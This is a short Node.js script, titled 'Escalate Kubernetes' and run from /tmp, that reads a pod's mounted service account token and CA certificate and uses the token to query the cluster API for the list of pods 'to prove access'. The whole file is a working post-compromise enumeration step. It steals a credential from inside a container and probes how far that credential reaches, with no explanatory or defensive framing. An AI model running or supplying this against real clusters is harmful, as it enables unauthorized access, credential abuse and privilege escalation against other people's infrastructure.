// Escalate Kubernetes
// Usage node /tmp/enum.js
const https = require('https');
const fs = require('fs');

// Path to the service account credentials
const TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token';
const CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt';

const token = fs.readFileSync(TOKEN_PATH, 'utf8');
const ca = fs.readFileSync(CA_PATH);

const options = {
  hostname: '10.1.0.1',
  port: 443,
  path: '/api/v1/namespaces/default/pods',
  method: 'GET',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/json'
  },
  // Verify using the cluster's own CA certificate
  ca: ca, 
  rejectUnauthorized: true 
};

const req = https.request(options, (res) => {
  let body = '';
  console.log(`HTTP Status: ${res.statusCode}`);
  
  res.on('data', (d) => { body += d; });
  res.on('end', () => {
    try {
      const json = JSON.parse(body);
      // Log the names of all pods found to prove access
      if (json.items) {
          console.log("Found Pods:");
          json.items.forEach(pod => console.log(` - ${pod.metadata.name}`));
      } else {
          console.log(JSON.stringify(json, null, 2));
      }
    } catch (e) {
      console.log("Raw Response:", body);
    }
  });
});

req.on('error', (e) => { console.error("Connection Error:", e.message); });
req.end();
